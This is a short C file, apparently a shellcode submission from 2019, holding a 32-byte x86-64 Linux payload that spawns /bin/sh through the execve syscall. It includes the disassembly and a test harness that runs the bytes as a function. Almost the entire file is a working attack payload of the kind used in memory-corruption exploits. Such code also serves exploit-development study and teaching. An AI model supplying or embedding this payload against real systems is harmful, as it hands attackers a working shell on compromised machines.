/*
	may 12 2019
    
    create by parth
    Tested on: Linux kali 4.19.0-4-amd64, x86_64 GNU/Linux
    Shellcode Length:  32

	0000000000401000 <_start>:
  401000:       48 31 c0                xor    rax,rax
  401003:       50                      push   rax
  401004:       48 bb 2f 2f 62 69 6e    movabs rbx,0x68732f6e69622f2f
  40100b:       2f 73 68 
  40100e:       53                      push   rbx
  40100f:       48 89 e7                mov    rdi,rsp
  401012:       50                      push   rax
  401013:       48 89 e2                mov    rdx,rsp
  401016:       57                      push   rdi
  401017:       48 89 e6                mov    rsi,rsp
  40101a:       48 83 c0 3b             add    rax,0x3b
  40101e:       0f 05                   syscall 
*/


#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\x48\x31\xc0\x50\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x48\x89\xe7\x50\x48\x89\xe2\x57\x48\x89\xe6\x48\x83\xc0\x3b\x0f\x05";


main()
{

	printf("Shellcode Length:  %d\n", (int)strlen(code));

	int (*ret)() = (int(*)())code;

	ret();

}
